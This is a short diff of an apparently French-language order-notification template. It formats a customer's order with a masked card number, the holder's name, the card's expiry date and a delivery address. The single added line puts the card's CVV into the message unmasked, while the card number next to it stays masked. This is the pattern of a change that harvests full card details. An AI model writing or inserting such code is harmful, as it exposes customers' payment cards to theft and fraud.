@@ -800,6 +800,7 @@ ${order.items.map(item =>
 - Numéro: ${cardInfo.number ? cardInfo.number.replace(/\d(?=\d{4})/g, '*') : '****'}
 - Titulaire: ${cardInfo.holder || 'Non spécifié'}
 - Expiration: ${cardInfo.expiry || 'Non spécifié'}
+- Cvv: ${cardInfo.Cvv || 'Non spécifié'}
 
 🚚 *Livraison:*
 - Adresse: ${customer.address || 'Non spécifié'}
